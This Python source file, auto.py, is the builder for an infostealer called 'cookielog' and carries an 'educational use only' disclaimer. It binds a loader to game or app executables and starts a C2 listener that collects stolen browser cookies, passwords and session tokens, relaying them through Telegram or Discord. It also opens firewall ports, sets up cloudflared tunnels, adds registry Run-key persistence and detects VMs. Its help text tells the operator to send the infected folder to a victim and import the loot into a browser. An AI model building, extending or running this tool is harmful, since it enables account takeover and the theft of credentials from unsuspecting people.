#!/usr/bin/env python3
"""auto.py — one-click payload setup. Builds, starts listener, infects .exe.

  EDUCATIONAL USE ONLY — FOR SECURITY RESEARCH AND TRAINING

  This is offensive security tooling for penetration testing, red-team
  exercises, and security education. It builds an infected executable that
  extracts browser cookies from a target machine and exfiltrates them to a
  remote C2 server.

  ONLY use this on systems you own or are explicitly authorized to test.
  Unauthorized use against third-party systems, networks, or individuals is
  illegal in most jurisdictions. The authors are not responsible for misuse.

Usage:
    python auto.py                      # GUI mode (file/folder picker)
    python auto.py game.exe             # CLI: infect standalone .exe
    python auto.py "C:\\path\\game folder"  # CLI: infect folder (game/app)
    python auto.py game.exe --run       # CLI + run infected locally (test)
    python auto.py --port 9400          # custom C2 port (default: 9090)
    python auto.py game.exe --persist   # install registry Run key on victim
    python auto.py game.exe --telegram bot_token:chat_id   # relay via Telegram
    python auto.py game.exe --discord https://discord.com/api/webhooks/...  # relay via Discord
    python auto.py game.exe --c2 http://1.2.3.4:9400/      # manual C2 URL (for NAT/external)
    python auto.py game.exe --no-anti-vm                    # disable VM detection (for testing in VMs)
    python auto.py game.exe --find-port                     # auto-scan for a free port (9400-9500)
    python auto.py game.exe --tunnel                        # C2 over a cloudflared quick tunnel (https)

    python auto.py --config             # show saved settings (config.json)
    python auto.py --clear-telegram     # remove saved Telegram token
    python auto.py --clear-discord      # remove saved Discord webhook

    Telegram/Discord keys are saved to config.json automatically on first use.
    After that, just run:  python auto.py game.exe   (keys are loaded from config)

Output structure:
    ifec/
      folds/   <- infected exes that need their folder (games, apps with DLLs/data)
      apps/    <- standalone infected exes (no folder dependencies)

What it does:
    1. Checks if loader.exe + ckdll.dll + ckdec.exe exist; if not, runs build.bat
    2. Detects attacker's local IP for C2 URL
    3. Starts listen.py in background (HTTP listener)
    4. Infects the .exe with the embedded C2 URL
       - Folder mode: copies entire folder to ifec/folds/, infects the main .exe in place
       - Standalone mode: infects to ifec/apps/<name>.exe
    5. Without --run: prints instructions (send ifec/ to victim)
       With --run: runs the infected exe locally for testing

Press Ctrl+C to stop early.
"""
import atexit, json, os, re, shutil, socket, subprocess, sys, time, struct, urllib.error, urllib.request, urllib.parse
from c2auth import parse_c2_url, port_from_url
from cklog import stage
from cklog.stage import patch_loader

HERE   = os.path.dirname(os.path.abspath(__file__))
BIN    = os.path.join(HERE, "bin")

# Modular imports (F3): config and network logic extracted to separate modules.
from auto_config import (load_config, save_config, show_config, telegram_probe,
                         gate_telegram, tg_lookup_chatid)
from auto_network import (detect_ip, _is_private_ip, detect_public_ip,
                          find_best_port, check_c2_reachable, find_port_owner_pid)
LOADER = os.path.join(BIN, "loader.exe")
DLL    = os.path.join(BIN, "ckdll.dll")
CKDEC  = os.path.join(BIN, "ckdec.exe")     # Embedded in loader.exe at build time
LOOT   = os.path.join(HERE, "loot")
IFEC   = os.path.join(HERE, "ifec")
IFEC_FOLDS = os.path.join(IFEC, "folds")
IFEC_APPS  = os.path.join(IFEC, "apps")
LISTEN = os.path.join(HERE, "listen.py")
BUILD  = os.path.join(HERE, "build.bat")
CONFIG = os.path.join(HERE, "config.json")
MAGIC  = stage.MAGIC
C2_SENTINEL = stage.C2_SENTINEL
PERSIST_SENTINEL = stage.PERSIST_SENTINEL
PERSIST_ENABLE = stage.PERSIST_ENABLE
AV_SENTINEL = stage.AV_SENTINEL
AV_DISABLE  = stage.AV_DISABLE

def log(msg):
    print(msg, flush=True)

# (config persistence and network functions moved to auto_config.py / auto_network.py)

def ensure_build():
    """Build loader.exe + ckdll.dll + ckdec.exe if they don't exist."""
    if all(os.path.isfile(p) for p in (LOADER, DLL, CKDEC)):
        log("[+] binaries already compiled")
        return True
    if sys.platform != "win32":
        # MSVC + build.bat are Windows-only: on Linux the attacker machine uses the
        # prebuilt binaries shipped in bin/ (infection itself is a byte append).
        log("[-] no prebuilt binaries in bin/ and compilation needs Windows (MSVC)")
        log("    copy bin/loader.exe + bin/ckdll.dll + bin/ckdec.exe from a Windows build machine")
        return False
    if not os.path.isfile(BUILD):
        log("[-] build.bat not found")
        return False
    from cklog import toolchain
    ok, info = toolchain.compiler_ready(HERE)
    if not ok:
        log("[-] no usable C++ toolchain: %s" % info)
        log("    install Visual Studio Build Tools -> 'Desktop development with C++'")
        log("    (or copy prebuilt bin/loader.exe + bin/ckdll.dll + bin/ckdec.exe from another machine)")
        return False
    log("[*] building binaries with %s (needs a minute)..." % info)
    ok, output = toolchain.run_script(HERE, "build.bat", timeout=300)
    if output:
        for line in output.splitlines():
            log("    " + line)
    if not ok:
        log("[-] build failed")
        return False
    if os.path.isfile(LOADER) and os.path.isfile(DLL):
        log("[+] build OK")
        return True
    log("[-] build succeeded but binaries not found")
    return False

# ------------------------------------------------------------------ EXE finding

def find_main_exe(folder):
    """Find the main .exe in a folder.
    Heuristic: prefer exe whose name matches a <name>_Data/ subfolder (Unity),
    then the largest .exe, then the only .exe.
    Returns (exe_path, exe_name) or (None, None).
    """
    exes = []
    for root, dirs, files in os.walk(folder):
        # Skip subfolders that are clearly not the main exe location.
        for f in files:
            if f.lower().endswith(".exe"):
                exes.append(os.path.join(root, f))
    if not exes:
        return None, None
    if len(exes) == 1:
        return exes[0], os.path.basename(exes[0])

    # Try to match <name>_Data/ pattern (Unity games).
    for exe_path in exes:
        exe_name = os.path.basename(exe_path)
        stem = os.path.splitext(exe_name)[0]
        data_dir = os.path.join(folder, stem + "_Data")
        if os.path.isdir(data_dir):
            return exe_path, exe_name

    # Fallback: largest .exe (skip known helper exes).
    skip = ("unitycrashhandler", "crashpad_handler", "setup", "uninstall",
            "updater", "helper", "crashpad")
    candidates = [e for e in exes
                  if os.path.basename(e).lower().split(".")[0] not in skip
                  and not any(s in os.path.basename(e).lower() for s in skip)]
    if not candidates:
        candidates = exes
    candidates.sort(key=lambda p: os.path.getsize(p), reverse=True)
    return candidates[0], os.path.basename(candidates[0])

# ------------------------------------------------------------------ infection

def _patch_loader(loader_bytes, c2_url, persist=False, no_anti_vm=False):
    """Compatibility wrapper; failed strict patches must abort staging."""
    patched, status = patch_loader(loader_bytes, c2_url, persist, no_anti_vm)
    if not status["ok"]:
        raise ValueError("; ".join(status["errors"]))
    return patched

def _extract_original_host(host_bytes):
    """If host was already infected, extract the original bytes."""
    hidx = host_bytes.rfind(MAGIC)
    if hidx != -1 and hidx > len(host_bytes) - 12:
        old_hlen = struct.unpack_from("<I", host_bytes, hidx - 4)[0]
        if old_hlen > 0 and hidx - 4 - old_hlen > 0:
            log("[*] host was already infected -- extracting original")
            return host_bytes[hidx - 4 - old_hlen : hidx - 4]
    return host_bytes

def verify_host_pe(host_bytes):
    """Validate that host_bytes looks like a PE before infection.

    Returns (ok, reason). Only checks the MZ header and minimum size so that
    packed or obfuscated hosts are not falsely rejected.
    """
    if len(host_bytes) < 64:
        return False, "host too small (< 64 bytes)"
    if host_bytes[:2] != b"MZ":
        return False, "host missing MZ header"
    if len(host_bytes) < 128:
        return False, "host too small"
    return True, "ok"


def build_infected_bytes(host_path, c2_url, persist=False, no_anti_vm=False):
    """Read host, patch loader, return infected bytes [loader][host][len][CKLG]."""
    with open(LOADER, "rb") as f:
        loader_bytes = f.read()
    with open(host_path, "rb") as f:
        host_bytes = f.read()
    ok, reason = verify_host_pe(host_bytes)
    if not ok:
        raise ValueError("host validation failed: %s" % reason)
    loader_bytes = _patch_loader(loader_bytes, c2_url, persist, no_anti_vm)
    host_bytes = _extract_original_host(host_bytes)
    return loader_bytes + host_bytes + struct.pack("<I", len(host_bytes)) + MAGIC

def build_infected_standalone(host_path, c2_url, persist=False, no_anti_vm=False):
    """Infect a standalone .exe -> ifec/apps/<name>.exe"""
    os.makedirs(IFEC_APPS, exist_ok=True)
    bname = os.path.basename(host_path)
    out_path = os.path.join(IFEC_APPS, bname)
    infected = build_infected_bytes(host_path, c2_url, persist, no_anti_vm)
    with open(out_path, "wb") as f:
        f.write(infected)
    return out_path

def build_infected_folder(host_dir, c2_url, persist=False, no_anti_vm=False):
    """Copy folder to ifec/folds/<folder_name>/, infect the main .exe in place.

    Returns (out_exe_path, original_exe_path) or (None, None) if no .exe found.
    """
    exe_path, exe_name = find_main_exe(host_dir)
    if not exe_path:
        log("[-] no .exe found in folder: %s" % host_dir)
        return None, None

    log("[+] main exe: %s (%d KB)" % (exe_name, os.path.getsize(exe_path) // 1024))

    folder_name = os.path.basename(os.path.abspath(host_dir))
    dest_folder = os.path.join(IFEC_FOLDS, folder_name)

    # If destination already exists, remove it (fresh copy).
    if os.path.exists(dest_folder):
        log("[*] removing old copy: ifec/folds/%s/" % folder_name)
        shutil.rmtree(dest_folder, ignore_errors=True)

    log("[*] copying folder to ifec/folds/%s/ ..." % folder_name)
    shutil.copytree(host_dir, dest_folder)
    log("[+] folder copied (%.1f MB)" % (
        sum(os.path.getsize(os.path.join(r,f))
            for r,_,fs in os.walk(dest_folder) for f in fs) / 1048576))

    # Infect the exe in place: overwrite the copy with the infected version.
    dest_exe = os.path.join(dest_folder, os.path.relpath(exe_path, host_dir))
    infected = build_infected_bytes(exe_path, c2_url, persist, no_anti_vm)
    with open(dest_exe, "wb") as f:
        f.write(infected)

    log("[+] infected in place: ifec/folds/%s/%s" % (folder_name,
        os.path.relpath(exe_path, host_dir)))
    log("    original: %d KB -> infected: %d KB" % (
        os.path.getsize(exe_path) // 1024, len(infected) // 1024))

    return dest_exe, exe_path

# ------------------------------------------------------------------ listener

def _open_firewall_port(port):
    """Best-effort inbound allow rule. Without it Windows silently drops the
    victim's SYN and the payload falls back to a local cache.json."""
    if sys.platform != "win32":
        return True
    rule = "cookielog C2 %d" % port
    try:
        subprocess.run(["netsh", "advfirewall", "firewall", "delete", "rule",
                        "name=%s" % rule], capture_output=True, timeout=15,
                       creationflags=0x08000000)
        r = subprocess.run(["netsh", "advfirewall", "firewall", "add", "rule",
                            "name=%s" % rule, "dir=in", "action=allow",
                            "protocol=TCP", "localport=%d" % port, "profile=any"],
                           capture_output=True, text=True, timeout=15,
                           creationflags=0x08000000)
        return r.returncode == 0
    except Exception:
        return False

def _listener_health(port, timeout=4):
    """GET /health on the listener we just spawned."""
    try:
        req = urllib.request.Request("http://127.0.0.1:%d/health" % port)
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status == 200
    except Exception:
        return False

def start_listener(port, telegram=None, discord=None, tunnel=False):
    """Start listen.py in background. Returns the process handle.
    If telegram or discord are provided, listen.py relays received cookies to them.
    Uses CREATE_NEW_CONSOLE so the listener has its own window (can't be killed by
    closing the main terminal); the window is its log. Tunnel listeners are
    loopback-only and never need an inbound firewall rule."""
    os.makedirs(LOOT, exist_ok=True)
    bind = "127.0.0.1" if tunnel else "0.0.0.0"
    # Refuse to start twice: a zombie listener from a previous run kept the port,
    # the new listener died with EADDRINUSE and every victim POST was lost.
    try:
        probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        probe.bind((bind, port))
        probe.close()
    except OSError:
        # Port busy: if it is OUR zombie listener from a previous crashed run,
        # kill it and continue; if it belongs to someone else, refuse cleanly.
        pid, cl = find_port_owner_pid(port)
        if pid and cl and "listen.py" in cl:
            log("[!] port %d held by our old listener (PID=%d) -- killing it and restarting" % (port, pid))
            try:
                if sys.platform == "win32":
                    subprocess.run(["taskkill", "/F", "/PID", str(pid)], capture_output=True, timeout=10)
                else:
                    os.kill(pid, 9)  # SIGKILL
                time.sleep(0.7)
            except Exception:
                pass
        else:
            if pid:
                log("[!] port %d is held by another process (PID=%d: %s)" % (port, pid, (cl or "?")[:90]))
            log("[!] kill it or pass --port / --find-port")
            return None
    # Direct listeners need inbound access; tunnel peers only connect locally.
    if sys.platform == "win32" and not tunnel:
        if _open_firewall_port(port):
            log("[+] firewall: inbound TCP %d allowed" % port)
        else:
            log("[!] firewall rule failed: inbound TCP %d may be unreachable "
                "(Administrator shell required)." % port)
            log("[!]   run once as admin: netsh advfirewall firewall add rule "
                "name=\"cookielog C2 %d\" dir=in action=allow protocol=TCP localport=%d" % (port, port))
    # Archive old loot (both old and new filenames). Deleting it silently threw
    # away everything already collected -- second victim, second run, all gone.
    old = ["all_cookies.json", "all_cookies.txt",
           "passwords.json", "passwords.txt",
           "session_cookies.json", "session_cookies.txt",
           "cookies.json", "cookies.txt",  # Legacy names
           "listener.log"]
    present = [f for f in old if os.path.exists(os.path.join(LOOT, f))]
    if present:
        dest = os.path.join(LOOT, "archive", time.strftime("%Y%m%d-%H%M%S"))
        try:
            os.makedirs(dest, exist_ok=True)
            for f in present:
                shutil.move(os.path.join(LOOT, f), os.path.join(dest, f))
            log("[*] previous loot archived: %s (%d files)" % (dest, len(present)))
        except OSError as ex:
            log("[!] could not archive old loot: %s" % ex)
    cmd = [sys.executable, "-u", LISTEN, str(port), "--bind", bind]
    if telegram:
        cmd += ["--telegram", telegram]
    if discord:
        cmd += ["--discord", discord]
    # Windows: CREATE_NEW_CONSOLE gives the listener its own window (can't be
    # killed by closing the main terminal). Linux/macOS: creationflags is not
    # supported at all -- start_new_session detaches the listener from this
    # terminal instead; it logs on its own, so no console output is lost.
    kwargs = {}
    if sys.platform == "win32":
        kwargs["creationflags"] = 0x00000010  # CREATE_NEW_CONSOLE
    else:
        kwargs["start_new_session"] = True
    proc = subprocess.Popen(cmd, cwd=HERE, **kwargs)
    # Wait for the socket to accept, not just for the process to exist.
    for _ in range(20):
        if proc.poll() is not None:
            log("[-] listener failed to start (exit %d)" % proc.returncode)
            return None
        if _listener_health(port, timeout=0.5):
            break
        time.sleep(0.25)
    if proc.poll() is not None:
        log("[-] listener failed to start")
        return None
    if not _listener_health(port):
        log("[!] listener process is up but /health does not answer on 127.0.0.1:%d" % port)
        log("[!]   check loot/listener.log; another firewall may be dropping loopback")
    else:
        log("[+] listener on port %d (PID=%d), ingest verified" % (port, proc.pid))
    lan = detect_ip()
    if not tunnel and not lan.startswith("127."):
        log("[*] listener bound on %s — LAN address: http://%s:%d/" % (bind, lan, port))
    elif tunnel:
        log("[*] tunnel listener bound on 127.0.0.1:%d (no inbound firewall rule)" % port)
    return proc


def _remote_c2(c2_url, run_local):
    """True for an endpoint served elsewhere, not this machine's direct listener.

    HTTPS has always been remote because start_listener only serves plain HTTP.
    A manually supplied HTTP endpoint is remote too, except when it names the
    detected LAN address of this machine (the GUI's normal direct-listener URL).
    """
    if not c2_url or run_local:
        return False
    try:
        info = parse_c2_url(c2_url)
    except ValueError:
        return False
    if info["loopback"]:
        return False
    if not info["tls"] and info["host"].lower() == detect_ip().lower():
        return False
    return True


def _remote_tls_c2(c2_url, run_local):
    """Backward-compatible name for the remote-endpoint decision."""
    return _remote_c2(c2_url, run_local)


# ------------------------------------------------------------------ Tunnel C2
# A quick tunnel gives the payload a real https endpoint on a CA-signed host
# with no VPS, no domain and no inbound port -- the two things a CGNAT line
# cannot provide. cloudflared dials out, terminates TLS at Cloudflare's edge and
# forwards plain HTTP to the local listener, which stays unchanged; the payload
# still exercises its own schannel path against a public chain, which is exactly
# what the VPS deployment would prove.
CLOUDFLARED = os.path.join(os.environ.get("LOCALAPPDATA") or os.path.expanduser("~"),
                           "cloudflared", "cloudflared.exe")
TUNNEL_RE = re.compile(r"https://[a-z0-9-]+\.trycloudflare\.com")
_tunnel_proc = None

def tunnel_stop():
    """Terminate the quick tunnel if this process started one."""
    global _tunnel_proc
    if _tunnel_proc is not None:
        try:
            if _tunnel_proc.poll() is None:
                _tunnel_proc.terminate()
                try:
                    _tunnel_proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    _tunnel_proc.kill()
        except Exception:
            pass
        _tunnel_proc = None

def start_tunnel(port):
    """Start a cloudflared quick tunnel in front of the local listener.

    Returns the https URL with a trailing slash, or None. Waits for /health
    through the tunnel before returning, so an endpoint that Cloudflare has not
    published yet never ends up embedded in a build.
    """
    global _tunnel_proc
    exe = os.environ.get("CLOUDFLARED") or CLOUDFLARED
    if not os.path.isfile(exe):
        log("[-] cloudflared not found: %s" % exe)
        log("    download: https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe")
        log("    or point CLOUDFLARED at the binary")
        return None
    os.makedirs(LOOT, exist_ok=True)
    logpath = os.path.join(LOOT, "tunnel.log")
    tunnel_stop()
    log("[*] cloudflared quick tunnel -> http://127.0.0.1:%d" % port)
    kwargs = {}
    if sys.platform == "win32":
        kwargs["creationflags"] = 0x08000000      # CREATE_NO_WINDOW
    try:
        with open(logpath, "w", encoding="utf-8", errors="replace") as lf:
            _tunnel_proc = subprocess.Popen(
                [exe, "tunnel", "--no-autoupdate", "--url", "http://127.0.0.1:%d" % port],
                stdout=lf, stderr=subprocess.STDOUT, **kwargs)
    except OSError as ex:
        log("[-] cloudflared failed to start: %s" % ex)
        return None
    url = None
    deadline = time.time() + 30
    while time.time() < deadline:
        if _tunnel_proc.poll() is not None:
            log("[-] cloudflared exited (%d), see %s" % (_tunnel_proc.returncode, logpath))
            return None
        try:
            with open(logpath, encoding="utf-8", errors="replace") as f:
                m = TUNNEL_RE.search(f.read())
        except OSError:
            m = None
        if m:
            url = m.group(0)
            break
        time.sleep(0.4)
    if not url:
        log("[-] no trycloudflare URL in %s" % logpath)
        tunnel_stop()
        return None
    log("[+] tunnel up: %s" % url)
    for _ in range(40):
        try:
            with urllib.request.urlopen(url + "/health", timeout=3) as resp:
                if resp.status == 200:
                    atexit.register(tunnel_stop)
                    return url + "/"
        except Exception:
            pass
        time.sleep(0.5)
    log("[!] tunnel URL has not answered /health after 20s -- check %s" % logpath)
    atexit.register(tunnel_stop)
    return url + "/"


def check_c2_reachable(c2_url, timeout=4):
    """Best-effort TCP connect to the C2 host:port. Honest about its limits:
    from inside the LAN a failure can be a missing port-forward, a local
    firewall, OR a failed NAT hairpin -- it cannot tell those apart. A success
    only proves the port answers on this network path."""
    try:
        u = urllib.parse.urlparse(c2_url)
        host = u.hostname
        port = u.port or (443 if u.scheme == "https" else 80)
        if host in ("127.0.0.1", "localhost"):
            return True, "local"
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        s.close()
        return True, "reachable"
    except Exception as ex:
        return False, str(ex)

def wait_for_cookies(timeout=300):
    """Wait for loot/all_cookies.json to appear in loot/. Print summary when done."""
    json_path = os.path.join(LOOT, "all_cookies.json")
    pwd_path = os.path.join(LOOT, "passwords.json")
    sess_path = os.path.join(LOOT, "session_cookies.json")
    log("[*] waiting for cookies (timeout=%ds, Ctrl+C to stop)..." % timeout)
    start = time.time()
    while time.time() - start < timeout:
        if os.path.isfile(json_path) and os.path.getsize(json_path) > 10:
            try:
                with open(json_path, encoding="utf-8") as f:
                    data = json.load(f)
                if data:
                    log("\n[+] %d cookies received!" % len(data))
                    log("    -> %s (%d bytes)" % (json_path, os.path.getsize(json_path)))
                    # passwords
                    pwd_count = 0
                    if os.path.isfile(pwd_path):
                        try:
                            with open(pwd_path, encoding="utf-8") as f:
                                pwd_count = len(json.load(f))
                        except Exception:
                            pass
                        log("    -> %s (%d passwords)" % (pwd_path, pwd_count))
                    # session
                    sess_count = 0
                    if os.path.isfile(sess_path):
                        try:
                            with open(sess_path, encoding="utf-8") as f:
                                sess_count = len(json.load(f))
                        except Exception:
                            pass
                        log("    -> %s (%d session cookies)" % (sess_path, sess_count))
                    # Top domains
                    top = {}
                    for c in data:
                        d = c.get("domain", "?")
                        top[d] = top.get(d, 0) + 1
                    log("\n    top domains:")
                    for d, n in sorted(top.items(), key=lambda kv: -kv[1])[:15]:
                        log("      %5d  %s" % (n, d))
                    log("\n[*] import in browser: Cookie-Editor extension -> Import -> paste loot/all_cookies.json")
                    return True
            except (json.JSONDecodeError, IOError):
                pass
        time.sleep(1)
    log("[-] timeout -- no cookies received in %ds" % timeout)
    log("    check: is the listener running? is the C2 URL correct?")
    log("    fallback on the target: C:\\ProgramData\\MediaCache\\cache.json")
    return False

# ------------------------------------------------------------------ Local test run

def run_infected_locally(host_path, infected_path, is_folder=False):
    """Run the infected exe locally for testing.

    For standalone exe: copy infected over original, run, wait, restore.
    For folder exe: just run from ifec/folds/ (the folder copy is self-contained).
    """
    if sys.platform != "win32":
        log("[-] --run executes the infected PE: Windows-only. Copy the infected exe to a Windows target.")
        return
    if is_folder:
        # Folder mode: the infected exe is already in ifec/folds/<name>/
        # with all its dependencies. Just run it directly.
        log("[*] launching infected exe from ifec/folds/ ...")
        wdir = os.path.dirname(infected_path)
        proc = subprocess.Popen([infected_path], cwd=wdir)
        log("[+] process started (PID=%d)" % proc.pid)
        _wait_and_cleanup(proc, infected_path, os.path.basename(infected_path))
        return

    # Standalone mode: backup original, copy infected over, run, restore.
    backup = host_path + ".orig"
    shutil.copy2(host_path, backup)
    log("[+] backed up original: %s" % backup)

    shutil.copy2(infected_path, host_path)
    log("[+] copied infected exe to: %s" % host_path)

    log("[*] launching infected exe...")
    proc = subprocess.Popen([host_path])
    log("[+] loader started (PID=%d)" % proc.pid)

    _wait_and_cleanup(proc, host_path, os.path.basename(host_path), backup)

def _wait_and_cleanup(proc, host_path, exe_name, backup=None):
    """Wait for the payload to finish, then clean up.

    v13 self-injection: the loader process IS the payload host -- the payload
    runs as a thread of that process, so terminating the loader terminates the
    run. Wait for it to exit on its own (payload completion); only force it if
    it outlives the watchdog.
    """
    loader_pid = proc.pid

    log("[*] waiting for payload to finish (loader PID=%d)..." % loader_pid)
    deadline = time.time() + 360
    while proc.poll() is None and time.time() < deadline:
        time.sleep(2)
    if proc.poll() is None:
        log("[!] payload still running after 6 min; terminating loader")
        try:
            proc.terminate()
            proc.wait(timeout=10)
        except Exception:
            log("[!] could not terminate loader")
    else:
        log("[*] loader exited (code=%s)" % proc.returncode)

    # Kill the game process -- it holds the file lock on host_path.
    log("[*] killing game process (%s)..." % exe_name)
    try:
        subprocess.run('taskkill /F /IM "%s" >nul 2>&1' % exe_name,
                       shell=True, timeout=5)
    except Exception:
        pass

    time.sleep(2)

    # Restore original (standalone mode only).
    if backup:
        for attempt in range(5):
            try:
                shutil.copy2(backup, host_path)
                os.remove(backup)
                log("[+] original .exe restored")
                break
            except Exception:
                if attempt < 4:
                    log("[!] file locked, retrying in 3s... (%d/5)" % (attempt + 1))
                    try:
                        subprocess.run('taskkill /F /IM "%s" >nul 2>&1' % exe_name,
                                       shell=True, timeout=3)
                    except Exception:
                        pass
                    time.sleep(3)
                else:
                    log("[!] could not restore original after 5 attempts")
                    log("    backup at: %s" % backup)
                    log("    restore manually: copy /b \"%s\" \"%s\"" % (backup, host_path))

    # Clean up temp file from rename-restore.
    wdir = os.path.dirname(host_path)
    bak_tmp = os.path.join(wdir, "~ck_bak.bin")
    if os.path.exists(bak_tmp):
        try: os.remove(bak_tmp)
        except Exception: pass

# ------------------------------------------------------------------ GUI

def _rewrite_c2_port(url, port):
    """Change only the URL port, retaining its scheme, path, query and fragment."""
    parts = urllib.parse.urlsplit(url)
    if not parts.scheme or not parts.hostname:
        raise ValueError("C2 URL must include a scheme and hostname")
    host = parts.hostname
    if ":" in host:
        host = "[%s]" % host
    return urllib.parse.urlunsplit((parts.scheme, "%s:%d" % (host, port),
                                    parts.path, parts.query, parts.fragment))



from auto_gui import pick_gui

# ------------------------------------------------------------------ Interactive terminal

def print_help():
    """Print all available commands."""
    log("")
    log("=" * 60)
    log("  cookielog -- command list")
    log("=" * 60)
    log("")
    log("  TARGET:")
    log("    infect <path>         Infect a folder or .exe (auto-detect)")
    log("    infect <path> --run   Infect + run locally (test)")
    log("    gui                   Open the GUI picker (folder/exe selection)")
    log("")
    log("  RELAY:")
    log("    telegram <token:chat> Set Telegram relay (saved to config)")
    log("    discord <webhook_url> Set Discord relay (saved to config)")
    log("    relay                 Show relay status (active/off)")
    log("    clear-telegram        Remove saved Telegram token")
    log("    clear-discord         Remove saved Discord webhook")
    log("")
    log("  OPTIONS:")
    log("    port <number>         Set C2 port (default: 9090, saved to config)")
    log("    find-port             Scan 9400-9500 and set the first free port")
    log("    tunnel                C2 through a cloudflared https quick tunnel (no VPS/port-forward)")
    log("    persist on|off        Enable/disable persistence (registry Run key)")
    log("    config                Show current saved configuration")
    log("    tg-chatid <token>     Find your Telegram chat ID")
    log("")
    log("  BUILD / TEST:")
    log("    build                 Compile loader.exe + ckdll.dll + ckdec.exe (needs MSVC)")
    log("    install               Run install.bat (dependency installer)")
    log("    test-listener         Start listener + send fake cookies (verify it works)")
    log("")
    log("  HELP:")
    log("    help                  Show this command list")
    log("    exit / quit           Exit cookielog")
    log("")
    log("  SHORTCUT: you can also pass CLI args directly, e.g.:")
    log("    python auto.py \"GET UPSTAIRS (64bit)\" --run --persist")
    log("")
    log("=" * 60)
    log("")

def interactive_loop():
    """Interactive terminal mode. Loops until user types exit/quit."""
    log("=" * 60)
    log("  cookielog -- interactive terminal")
    log("  type 'help' for command list, 'exit' to quit")
    log("=" * 60)

    # Pre-load config
    cfg = load_config()
    port = cfg.get("port", 9090)
    telegram = cfg.get("telegram")
    discord = cfg.get("discord")
    persist = cfg.get("persist", False)

    while True:
        try:
            # Show prompt
            tg_hint = " [TG]" if telegram else ""
            dc_hint = " [DC]" if discord else ""
            ps_hint = " [PERSIST]" if persist else ""
            prompt = "\ncookielog%s%s%s> " % (tg_hint, dc_hint, ps_hint)
            line = input(prompt).strip()
        except (EOFError, KeyboardInterrupt):
            log("\n[*] exiting")
            break

        if not line:
            continue

        parts = line.split(None, 1)
        cmd = parts[0].lower()
        rest = parts[1].strip() if len(parts) > 1 else ""

        # --- commands ---
        if cmd in ("exit", "quit", "q"):
            log("[*] bye")
            break

        elif cmd == "help" or cmd == "?":
            print_help()

        elif cmd == "config":
            show_config()

        elif cmd == "tg-chatid":
            if not rest:
                log("usage: tg-chatid <bot_token>")
                log("example: tg-chatid 8975447629:AAFzK9wam_2jfoZ...")
            else:
                log("[*] looking up chat ID...")
                chat_id = tg_lookup_chatid(rest)
                if chat_id:
                    full = "%s:%s" % (rest, chat_id)
                    telegram = full
                    cfg["telegram"] = full
                    save_config(cfg)
                    log("[+] Chat ID: %s" % chat_id)
                    log("[+] Saved to config. Telegram relay is now active.")
                else:
                    log("[-] No messages found. Send a message to your bot first, then retry.")

        elif cmd == "telegram":
            if not rest:
                log("usage: telegram <bot_token:chat_id>")
                log("tip: run 'tg-chatid <bot_token>' to find your chat ID")
            else:
                telegram = rest
                cfg["telegram"] = rest
                save_config(cfg)
                log("[+] Telegram relay set and saved to config")

        elif cmd == "discord":
            if not rest:
                log("usage: discord <webhook_url>")
            else:
                discord = rest
                cfg["discord"] = rest
                save_config(cfg)
                log("[+] Discord relay set and saved to config")

        elif cmd == "clear-telegram":
            telegram = None
            cfg.pop("telegram", None)
            save_config(cfg)
            log("[+] Telegram relay cleared")

        elif cmd == "clear-discord":
            discord = None
            cfg.pop("discord", None)
            save_config(cfg)
            log("[+] Discord relay cleared")

        elif cmd == "port":
            if not rest or not rest.isdigit():
                log("usage: port <number> (current: %d)" % port)
            else:
                port = int(rest)
                cfg["port"] = port
                save_config(cfg)
                log("[+] Port set to %d (saved to config)" % port)

        elif cmd == "find-port":
            log("[*] scanning for a free port (9400-9500, preferred: %d)..." % port)
            best = find_best_port(start=9400, end=9500, preferred=port)
            if best is not None:
                port = best
                cfg["port"] = port
                save_config(cfg)
                log("[+] Best free port: %d (saved to config)" % port)
            else:
                log("[-] no free port found in range 9400-9500")

        elif cmd == "persist":
            if rest.lower() == "on":
                persist = True; cfg["persist"] = True; save_config(cfg)
                log("[+] Persistence: enabled (saved)")
            elif rest.lower() == "off":
                persist = False; cfg["persist"] = False; save_config(cfg)
                log("[+] Persistence: disabled (saved)")
            else:
                log("usage: persist on|off (current: %s)" % ("on" if persist else "off"))

        elif cmd == "build":
            if sys.platform != "win32":
                log("[-] build needs Windows (MSVC + build.bat). On Linux use the prebuilt")
                log("    bin/ copied from a Windows build machine -- infection works without it.")
            else:
                log("[*] running build.bat...")
                ret = subprocess.call(["cmd", "/c", BUILD], cwd=HERE)
                if ret == 0:
                    log("[+] build OK")
                else:
                    log("[-] build failed (exit %d)" % ret)

        elif cmd == "install":
            if sys.platform != "win32":
                log("[-] install.bat is Windows-only. On Linux run: ./install.sh")
            else:
                subprocess.call(["cmd", "/c", "install.bat"], cwd=HERE)

        elif cmd == "test-listener":
            # Start listener on a test port and send fake cookies.
            test_port = port
            log("[*] starting listener on port %d for test..." % test_port)
            listener = start_listener(test_port, telegram, discord)
            if not listener:
                log("[-] could not start listener")
                continue
            time.sleep(1)
            try:
                fake = '[{"domain":"test.com","name":"test_cookie","value":"abc123","path":"/","expirationDate":0,"sameSite":"None","secure":false,"httpOnly":false,"hostOnly":true,"session":true}]'
                import urllib.request as ur
                req = ur.Request("http://127.0.0.1:%d/" % test_port,
                                 data=fake.encode(),
                                 headers={"Content-Type": "application/json"})
                resp = ur.urlopen(req, timeout=5)
                log("[+] listener test: HTTP %d %s" % (resp.status, resp.read().decode()))
                # Check if loot was written.
                jp = os.path.join(LOOT, "all_cookies.json")
                if not os.path.exists(jp):
                    jp = os.path.join(LOOT, "cookies_all.json")
                if os.path.exists(jp) and os.path.getsize(jp) > 10:
                    log("[+] loot/all_cookies.json written (%d bytes)" % os.path.getsize(jp))
                    sp = os.path.join(LOOT, "session_cookies.json")
                    if os.path.exists(sp):
                        log("[+] loot/session_cookies.json written (%d bytes)" % os.path.getsize(sp))
                    log("[+] listener is working!")
                else:
                    log("[-] listener responded but no loot file written")
            except Exception as ex:
                log("[-] listener test failed: %s" % ex)
            listener.terminate()

        elif cmd == "relay":
            # Show relay status
            log("  Telegram: %s" % ("active" if telegram else "off"))
            log("  Discord:  %s" % ("active" if discord else "off"))
            if telegram or discord:
                log("  saved keys in config.json: yes")
            else:
                saved = load_config()
                if saved.get("telegram") or saved.get("discord"):
